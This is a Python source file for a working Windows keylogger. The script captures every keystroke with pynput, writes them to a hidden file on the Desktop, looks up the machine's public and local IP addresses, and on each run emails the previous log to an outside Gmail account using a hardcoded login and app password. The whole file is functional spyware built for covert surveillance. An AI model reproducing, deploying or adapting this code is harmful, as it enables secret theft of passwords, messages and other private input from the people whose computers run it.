import subprocess
import time
import os
import stat
import smtplib
import socket
from requests import get
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

def logger(key):
    # Creates .txt file and logs all inputs
    with open(f"C:\\Users\\{user}\\Desktop\\xc7dysLal.txt", "a") as file:
        file.write(f"{time.asctime()}: {key}\n".replace("'", ""))
    file.close()

def sendmail(sender, to, subject, file):
    # Filling out password with getpass module 
    print(f"From: {sender} To: {to}")
    password = "fwna iglf zclb jwtk"

    # Message
    msg = MIMEMultipart()
    msg["subject"] = subject
    msg["To"] = to
    msg["From"] = sender
    
    attachment = MIMEText("Email")
    attachment.add_header('Content-Disposition', 'attachment', filename=file)
    
    msg.attach(MIMEText(open(file).read()))

    print("File successfully attached")

    # Logging in and sending email
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
        # Logging in to smtp instance
        status_code, response = smtp_server.login(sender, password)
        print(f"[*] Logging in: {status_code} {response}")

        # Sending email
        smtp_server.sendmail(sender, to, msg.as_string())
        smtp_server.close()
    print("Email sent successfully")

user = os.getlogin()

def public_ip():    
    public_ip = get('https://api.ipify.org').content.decode('utf8')
    return public_ip

def local_ip():
    local_ip = socket.gethostbyname(socket.gethostname())
    return local_ip

# Get the current users name
user = os.getlogin()

def logMaker(file):
    if os.path.exists(file) == True:
        pass
    else:
        open(file, "x")
        
def fileHider(file):
    subprocess.run(["attrib", "+H", f"{file}"])

def checkIfHidden(file):
    # Attr is a list of attributes of the file and if it has stat.FILE_ATTRIBUTE_HIDDEN gives true
        attr = os.stat(file).st_file_attributes
        return bool(attr & stat.FILE_ATTRIBUTE_HIDDEN)

# For better cross compatibility, log file is created in Documents
log = f"C:\\Users\\{user}\\Desktop\\xc7dysLal.txt"

local = local_ip()
public = public_ip()
subject = f'Log from {public} / {local} Computer'
to = 'loglogsnd@gmail.com'
sender = 'insanelogcompile@gmail.com'

# Sends the log that was compiled the previous time file was executed

# Remakes log
if os.path.exists(log) == True:
    sendmail(sender=sender, to=to, subject=subject, file=log)
    os.remove(log)
    logMaker(log)
    fileHider(log)        
else:
    logMaker(log)
    fileHider(log)
    

with keyboard.Listener(on_press=logger) as listener:
    listener.join()
    